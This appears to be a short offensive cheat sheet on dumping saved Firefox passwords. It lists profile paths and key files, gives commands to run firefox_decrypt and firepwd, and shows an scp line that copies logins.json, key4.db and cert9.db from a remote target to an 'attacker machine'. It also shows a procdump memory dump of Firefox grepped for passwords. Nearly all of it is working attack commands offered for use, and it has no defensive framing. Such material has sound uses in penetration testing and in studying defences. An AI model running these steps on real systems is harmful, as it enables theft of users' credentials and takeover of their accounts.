# Firefox Saved Credential Dump

Firefox stores saved passwords in `logins.json` encrypted with a master key in `key4.db` (or `key3.db`).

**Profile location:**
```
Linux:   ~/.mozilla/firefox/<profile>.default/
Windows: C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\
```

**Key files:**
```
logins.json   — encrypted credentials
key4.db       — encryption key (SQLite3 NSS database)
cert9.db      — certificate store
```

**Extract with firefox_decrypt.py:**
```bash
git clone https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py ~/.mozilla/firefox/<profile>/
```

**Or use firepwd:**
```bash
git clone https://github.com/lclevy/firepwd
python3 firepwd.py -d ~/.mozilla/firefox/<profile>/
```

**Manual copy and decrypt (remote target):**
```bash
# Copy profile files to attacker machine:
scp user@<TARGET>:~/.mozilla/firefox/<profile>/{logins.json,key4.db,cert9.db} /tmp/ffprofile/
python3 firefox_decrypt.py /tmp/ffprofile/
```

**Also check:** process dump of running Firefox via `procdump` — may contain credentials in memory:
```cmd
procdump.exe -ma <firefox_pid> firefox.dmp
strings firefox.dmp | grep -E "(password|username|passwd)"
```
